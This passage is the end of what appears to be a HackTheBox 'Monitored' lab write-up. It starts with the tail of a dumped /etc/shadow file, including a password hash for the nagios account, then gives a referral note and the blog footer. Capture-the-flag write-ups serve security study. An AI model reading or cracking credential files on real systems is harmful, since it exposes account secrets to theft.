class="variable">$D2o</span>.A3O6EXWgKPzpD8Gky7cPbXZ/a9Ey/9/OM1AoE80:19671:0:99999:7:::</span><br><span class="line">systemd-coredump:!*:19670::::::</span><br><span class="line">mysql:!:19670:0:99999:7:::</span><br><span class="line">ntp:*:19670:0:99999:7:::</span><br><span class="line">postgres:*:19670:0:99999:7:::</span><br><span class="line">Debian-exim:!:19670:0:99999:7:::</span><br><span class="line">uuidd:*:19670:0:99999:7:::</span><br><span class="line">openldap:!:19670:0:99999:7:::</span><br><span class="line">Debian-snmp:!:19670:0:99999:7:::</span><br><span class="line">snmptt:*:19670:0:99999:7:::</span><br><span class="line">shellinabox:*:19670:0:99999:7:::</span><br><span class="line">nagios:$y$j9T<span class="variable">$EnaS672RtIQB0i6zh</span>.ooO/<span class="variable">$gkWPA1PKoIQH</span>.ACc6NVntLPY9x55i08J4S6c1Rpvqn.:19671:0:99999:7:::</span><br><span class="line">_laurel:!:19698::::::</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p><strong>Note</strong>: </p>
+<p>如果你是新手，加入 HTB 的 academy 可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&text=HackTheBox - Machine - Monitored"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&is_video=false&description=HackTheBox - Machine - Monitored"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Monitored&body=Check out this article: https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&name=HackTheBox - Machine - Monitored&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&t=HackTheBox - Machine - Monitored"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
